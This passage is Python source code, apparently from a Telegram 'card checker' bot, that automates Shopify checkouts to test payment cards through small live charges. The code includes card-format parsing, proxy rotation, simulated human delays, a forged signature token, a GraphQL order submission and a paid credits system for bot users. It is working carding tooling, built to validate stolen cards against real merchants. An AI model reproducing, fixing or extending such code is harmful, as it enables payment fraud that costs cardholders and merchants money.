                            "lines": [],
                            "acceptUnexpectedDiscounts": True,
                        },
                        "delivery": {
                            "deliveryLines": [
                                {
                                    "destination": {
                                        "streetAddress": {
                                            "address1": self.shipping_address["address1"],
                                            "city": self.shipping_address["city"],
                                            "countryCode": self.shipping_address["country"],
                                            "postalCode": self.shipping_address["zip"],
                                            "firstName": self.shipping_address["first_name"],
                                            "lastName": self.shipping_address["last_name"],
                                            "zoneCode": self.shipping_address["province"],
                                            "phone": self.shipping_address["phone"],
                                        },
                                    },
                                    "selectedDeliveryStrategy": {
                                        "deliveryStrategyMatchingConditions": {
                                            "estimatedTimeInTransit": {"any": True},
                                            "shipments": {"any": True},
                                        },
                                    },
                                    "targetMerchandiseLines": {
                                        "lines": [
                                            {"stableId": "default"},
                                        ],
                                    },
                                    "deliveryMethodTypes": ["PICKUP"],  # Changed from SHIPPING to PICKUP
                                },
                            ],
                        },
                        "merchandise": {
                            "merchandiseLines": [
                                {
                                    "stableId": "default",
                                    "merchandise": {
                                        "productVariantReference": {
                                            "id": "gid://shopify/ProductVariantMerchandise/43207284392098",  # Correct variant ID
                                            "variantId": "gid://shopify/ProductVariant/43207284392098",  # Correct variant ID
                                        },
                                    },
                                    "quantity": {"items": {"value": 1}},
                                    "expectedTotalPrice": {
                                        "value": {
                                            "amount": "1.00",
                                            "currencyCode": "USD",
                                        },
                                    },
                                },
                            ],
                        },
                        "payment": {
                            "paymentLines": [
                                {
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": "shopify_payments",
                                            "sessionId": session_id,
                                            "billingAddress": {
                                                "streetAddress": {
                                                    "address1": self.billing_address["address1"],
                                                    "city": self.billing_address["city"],
                                                    "countryCode": self.billing_address["country"],
                                                    "postalCode": self.billing_address["zip"],
                                                    "firstName": self.billing_address["first_name"],
                                                    "lastName": self.billing_address["last_name"],
                                                    "zoneCode": self.billing_address["province"],
                                                    "phone": self.billing_address["phone"],
                                                },
                                            },
                                        },
                                    },
                                    "amount": {
                                        "value": {
                                            "amount": "1.00",
                                            "currencyCode": "USD",
                                        },
                                    },
                                },
                            ],
                        },
                        "buyerIdentity": {
                            "customer": {
                                "presentmentCurrency": "USD",
                                "countryCode": self.shipping_address["country"],
                            },
                            "email": self.shipping_address["email"],
                            "phoneCountryCode": "US",
                        },
                        "taxes": {
                            "proposedTotalAmount": {
                                "value": {
                                    "amount": "0.00",  # No tip
                                    "currencyCode": "USD",
                                },
                            },
                        },
                    },
                    "attemptToken": f"{self.checkout_token}-{random.randint(1000, 9999)}",
                },
                "query": "mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) { submitForCompletion(input: $input, attemptToken: $attemptToken) { ... on SubmitSuccess { receipt { id } } ... on SubmitAlreadyAccepted { receipt { id } } ... on SubmitFailed { reason } ... on SubmitRejected { errors { ... on NegotiationError { code localizedMessage } } } ... on Throttled { pollAfter pollUrl queueToken } } }"
            }
            
            response = await client.post(
                url,
                headers=headers,
                json=json_data,
                cookies=self.cookies,
                timeout=30.0
            )
            
            self.console_logger.request_details("POST", url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed),
                                              "Final checkout submission")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    return self.parse_payment_response(data)
                except Exception as e:
                    self.console_logger.error_detail(f"Failed to parse checkout response: {str(e)}")
                    return False, "Checkout parse error"
            else:
                error_text = response.text[:200]
                self.console_logger.error_detail(f"Checkout failed: {response.status_code} - {error_text}")
                return False, f"Checkout failed: HTTP {response.status_code}"
                
        except Exception as e:
            self.console_logger.error_detail(f"Checkout completion error: {str(e)}")
            return False, f"Checkout error: {str(e)[:80]}"
    
    def parse_payment_response(self, data):
        """Parse payment response"""
        try:
            if not isinstance(data, dict):
                return False, "Invalid response format"
            
            # Check for GraphQL errors
            if 'errors' in data:
                errors = data['errors']
                if errors:
                    error_msg = errors[0].get('message', 'Payment failed')
                    return False, error_msg
            
            # Check for success in data
            submit_data = data.get('data', {}).get('submitForCompletion', {})
            
            if submit_data.get('__typename') == 'SubmitSuccess':
                receipt = submit_data.get('receipt', {})
                if receipt.get('id'):
                    return True, "ORDER_PLACED - Payment Successful"
                else:
                    return True, "ORDER_PLACED - Payment Successful (no receipt ID)"
            elif submit_data.get('__typename') == 'SubmitAlreadyAccepted':
                return True, "ORDER_ALREADY_ACCEPTED - Payment Successful"
            elif submit_data.get('__typename') == 'SubmitFailed':
                reason = submit_data.get('reason', 'Payment failed')
                return False, reason
            elif submit_data.get('__typename') == 'SubmitRejected':
                errors = submit_data.get('errors', [])
                if errors:
                    error_msg = errors[0].get('localizedMessage', 'Payment rejected')
                    return False, error_msg
            
            # Check for CAPTCHA
            response_text = str(data)
            if "captcha" in response_text.lower() or "robot" in response_text.lower():
                return False, "CAPTCHA_REQUIRED - Please try again"
            
            return False, "Payment declined - Unknown reason"
            
        except Exception as e:
            return False, f"Response error: {str(e)[:50]}"
    
    def generate_session_token(self):
        """Generate random session token"""
        chars = string.ascii_letters + string.digits + "-_"
        return ''.join(random.choice(chars) for _ in range(180))  # From logs, token is ~180 chars
    
    def generate_shopify_signature(self):
        """Generate Shopify identification signature"""
        # From logs: eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0...
        # Simplified version - actual signature is JWT
        header = "eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0"
        payload = "eyJjbGllbnRfaWQiOiIyIiwiY2xpZW50X2FjY291bnRfaWQiOiI2MDc1NzgwMzE3MCIsInVuaXF1ZV9pZCI6IjhkYWY1NWNmODFiMGEzZTgxMTA4MjdhNTY3ZDg4MGUzIiwiaWF0IjoxNzY5Njc2Njk2fQ"
        signature = "zeCs9d_EQPNcpOpifObx_TG8VYw8C5n-YXe_CMMuDgE"
        return f"{header}.{payload}.{signature}"
    
    async def check_card(self, card_details, username, user_data):
        """Main card checking method"""
        start_time = time.time()
        
        # Initialize console logger for this check
        self.console_logger = ConsoleLogger(self.user_id)
        self.console_logger.start_check(card_details)
        
        try:
            # Parse card details
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid card format", "ERROR", elapsed_time)
                return format_shopify_response("", "", "", "", "Invalid card format. Use: CC|MM|YY|CVV", elapsed_time, username, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Validate card details
            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid card number", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid month", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid year", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid CVV", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            # Log card validation success
            self.console_logger.sub_step(0, 1, f"Card validated: {cc[:6]}XXXXXX{cc[-4:]}")
            self.console_logger.sub_step(0, 2, f"Expiry: {mes}/{ano[-2:]} | CVV: {cvv}")

            # Create HTTP client
            client_params = {
                'timeout': 30.0,
                'follow_redirects': False,  # We need to handle redirects manually
                'http2': True
            }
            
            # Add proxy if available
            if self.current_proxy:
                client_params['proxy'] = self.current_proxy
                self.console_logger.sub_step(0, 3, f"Proxy enabled: {self.current_proxy[:50]}...")

            async with httpx.AsyncClient(**client_params) as client:
                # Step 1: Load homepage
                if not await self.load_homepage(client):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to load homepage", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Failed to initialize", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 2: Load product page
                if not await self.load_product_page(client):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to load product", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Product not available", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 3: Add to cart with correct variant ID
                if not await self.add_to_cart(client):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to add to cart", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Cart error - check variant", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 4: Go to cart page
                if not await self.go_to_cart_page(client):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to load cart", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Cart page error", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 5: Go to checkout
                success, checkout_result = await self.go_to_checkout(client)
                if not success:
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, checkout_result, "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, checkout_result, elapsed_time, username, user_data)
                checkout_url = checkout_result
                await self.human_delay(1, 2)
                
                # Step 6: Load checkout page for tokens
                if not await self.load_checkout_page(client, checkout_url):
                    self.console_logger.sub_step(6, 1, "Token extraction issues, continuing...")
                await self.human_delay(1, 2)
                
                # Step 7: Submit email
                success, email_result = await self.submit_email(client)
                if not success:
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, email_result, "EMAIL_ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, email_result, elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 8: Create payment session
                success, session_result = await self.create_payment_session(client, cc, mes, ano, cvv)
                if not success:
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, session_result, "DECLINED", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, session_result, elapsed_time, username, user_data)
                session_id = session_result
                await self.human_delay(1, 2)
                
                # Step 9: Complete checkout
                success, checkout_result = await self.complete_checkout(client, session_id)
                
                elapsed_time = time.time() - start_time
                
                # Log final result
                if success:
                    self.console_logger.result(True, checkout_result, "APPROVED", elapsed_time)
                else:
                    self.console_logger.result(False, checkout_result, "DECLINED", elapsed_time)
                
                return format_shopify_response(cc, mes, ano, cvv, checkout_result, elapsed_time, username, user_data)

        except httpx.TimeoutException:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, "Request timeout", "TIMEOUT", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, "TIMEOUT_ERROR: Request timeout", elapsed_time, username, user_data)
        except httpx.ConnectError:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, "Connection error", "CONNECTION_ERROR", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, "CONNECTION_ERROR: Connection failed", elapsed_time, username, user_data)
        except Exception as e:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, str(e), "UNKNOWN_ERROR", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:80]}", elapsed_time, username, user_data)

# Command handler
@Client.on_message(filters.command(["sh", ".sh", "$sh"]))
@auth_and_free_restricted
async def handle_shopify_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "sh")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            if charge_processor:
                await message.reply(charge_processor.get_usage_message(
                    "sh", 
                    "Shopify Charge",
                    "4111111111111111|12|2025|123"
                ))
            else:
                await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Invalid card format.
🠪 <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message
        processing_msg = await message.reply(
            f"""
<b>[Shopify Charge 0.55$] | #WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Checking card...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>
"""
        )

        # Create checker instance
        checker = ShopifyChargeChecker(user_id)

        # Process command through universal charge processor
        if charge_processor:
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,                    # positional
                checker.check_card,         # positional
                card_details,               # check_args[0]
                username,                   # check_args[1]
                user_data,                  # check_args[2]
                credits_needed=2,           # keyword
                command_name="sh",          # keyword
                gateway_name="Shopify Charge"  # keyword
            )

            await processing_msg.edit_text(result, disable_web_page_preview=True)
        else:
            # Fallback to old method if charge_processor not available
            result = await checker.check_card(card_details, username, user_data)
            await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
